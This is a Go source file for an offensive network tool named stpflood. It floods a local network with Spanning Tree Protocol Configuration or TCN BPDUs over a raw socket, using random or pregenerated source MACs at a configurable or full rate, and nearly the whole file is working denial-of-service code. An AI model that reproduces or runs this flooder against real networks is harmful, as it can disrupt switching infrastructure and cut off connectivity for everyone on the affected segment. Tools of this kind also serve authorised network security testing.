// Package stpflood implements STP DoS BPDU flooding.
package stpflood

import (
	"fmt"
	"net"
	"os"
	"os/signal"
	"sync/atomic"
	"time"
)

const defaultMACCount = 20_000

type rawSocket interface {
	Send(frame []byte) error
	Close() error
}

// Flooder sends STP Configuration or TCN BPDUs.
type Flooder struct {
	Interface string
	Count     int  // unique source MACs; 0 = generate fresh MAC each packet
	Rate      int  // packets per second; 0 = full speed
	TCN       bool // false = conf BPDU flood; true = TCN BPDU flood
}

func (f *Flooder) Run() error {
	label, stopped := f.labels()

	iface, err := net.InterfaceByName(f.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", f.Interface, err)
	}

	sock, err := openRawSocket(iface)
	if err != nil {
		return err
	}
	defer sock.Close()

	onTheFly := f.Count <= 0
	var packets [][]byte
	if !onTheFly {
		fmt.Printf("%s Pre-generating %d %s frames with unique MACs...\n", stpFloodTag, f.Count, label)
		packets = pregenerate(f.Count, f.TCN)
	}

	var total int64
	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped. Total %s sent: %d\n", stpFloodTag, stopped, atomic.LoadInt64(&total))
		os.Exit(0)
	}()

	go func() {
		t := time.NewTicker(time.Second)
		defer t.Stop()
		var prev int64
		for range t.C {
			cur := atomic.LoadInt64(&total)
			fmt.Printf("\r%s Total: %-12d  Rate: %-8d pps    ", stpFloodTag, cur, cur-prev)
			prev = cur
		}
	}()

	if f.Rate > 0 {
		fmt.Printf("%s Flooding %s on %s at %d pps — press Ctrl+C to stop.\n",
			stpFloodTag, label, f.Interface, f.Rate)
	} else {
		fmt.Printf("%s Flooding %s on %s at full speed — press Ctrl+C to stop.\n",
			stpFloodTag, label, f.Interface)
	}

	var interval time.Duration
	if f.Rate > 0 {
		interval = time.Second / time.Duration(f.Rate)
	}
	next := time.Now()

	build := func(mac [6]byte) []byte {
		if f.TCN {
			return buildTCNFrame(mac)
		}
		return buildConfFrame(mac, randU16(), randU16())
	}

	sendOne := func() {
		var frame []byte
		if onTheFly {
			frame = build(randMAC())
		} else {
			frame = packets[atomic.LoadInt64(&total)%int64(len(packets))]
		}
		_ = sock.Send(frame)
		atomic.AddInt64(&total, 1)
	}

	if onTheFly {
		for {
			if f.Rate > 0 {
				if now := time.Now(); now.Before(next) {
					time.Sleep(next.Sub(now))
				}
				next = next.Add(interval)
			}
			sendOne()
		}
	}

	for {
		for _, pkt := range packets {
			if f.Rate > 0 {
				if now := time.Now(); now.Before(next) {
					time.Sleep(next.Sub(now))
				}
				next = next.Add(interval)
			}
			_ = sock.Send(pkt)
			atomic.AddInt64(&total, 1)
		}
	}
}

func (f *Flooder) labels() (floodLabel, stoppedLabel string) {
	if f.TCN {
		return "TCN BPDUs", "TCN BPDUs"
	}
	return "conf BPDUs", "conf BPDUs"
}

func pregenerate(count int, tcn bool) [][]byte {
	if count <= 0 {
		count = defaultMACCount
	}
	seen := make(map[[6]byte]struct{}, count)
	out := make([][]byte, 0, count)
	for len(out) < count {
		mac := randMAC()
		if _, dup := seen[mac]; dup {
			continue
		}
		seen[mac] = struct{}{}
		if tcn {
			out = append(out, buildTCNFrame(mac))
		} else {
			out = append(out, buildConfFrame(mac, randU16(), randU16()))
		}
	}
	return out
}
